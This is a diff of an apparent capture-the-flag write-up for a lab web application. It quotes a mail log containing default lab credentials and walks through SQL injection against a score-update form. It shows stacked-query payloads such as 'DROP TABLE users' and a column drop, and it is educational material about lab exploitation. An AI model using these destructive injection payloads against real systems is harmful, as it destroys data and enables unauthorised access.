@@ -20,7 +20,36 @@ From `composer.lock`, I found out that the application uses Twig.
 
 #### Source code review
 
-... found file `mail.log`
+... found file `mail.log`&#x20;
+
+```
+From: dev@injectics.thm
+To: superadmin@injectics.thm
+Subject: Update before holidays
+
+Hey,
+
+Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.
+
+To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.
+
+Here are the default credentials that will be added:
+
+| Email                     | Password 	              |
+|---------------------------|-------------------------|
+| superadmin@injectics.thm  | superSecurePasswd101    |
+| dev@injectics.thm         | devPasswd123            |
+
+Please let me know if there are any further updates or changes needed.
+
+Best regards,
+Dev Team
+
+dev@injectics.thm
+
+```
+
+From this note, we can understand that ...
 
 ### Exploring the application
 
@@ -109,7 +138,7 @@ rank=1&country=1&gold=1&silver=1&bronze=1
 **Possible SQL query:**
 
 ```sql
-UPDATE table SET gold = x, silver = x, bronze = x WHERE id = x;
+UPDATE table SET gold = x, silver = x, bronze = x WHERE rank = x;
 ```
 
 **ATTEMPT 1**
@@ -120,11 +149,27 @@ Injection to the `gold` field:
 22, silver = 22, bronze = 22;-- // explicit space after comment
 ```
 
-```
-UPDATE table SET gold = 22, silver = 22;--, silver = x, bronze = x; 
+```sql
+UPDATE table SET gold = 22, silver = 22, bronze = 22;--, silver = x, bronze = x WHERE id = 'x';; 
 ```
 
+* This action will update the `gold`, `silver` and `bronze` field to **22** for every country. With that, we know that the SQL injection worked!
+
 **ATTEMPT 2**
+
+```sql
+1; DROP TABLE users;-- 
+1; ALTER TABLE users DROP COLUMN username;--
+```
+
+{% code overflow="wrap" %}
+```sql
+UPDATE table SET gold = 1 WHERE 1=1; DROP TABLE users;-- , bronze = x WHERE id = x;, silver = x, bronze = x WHERE id = x;
+
+```
+{% endcode %}
+
+
 
 **rank=1\&country=\&gold=22 WHERE 1=1; DROP TABLE users;--\&silver=1\&bronze=1**
 
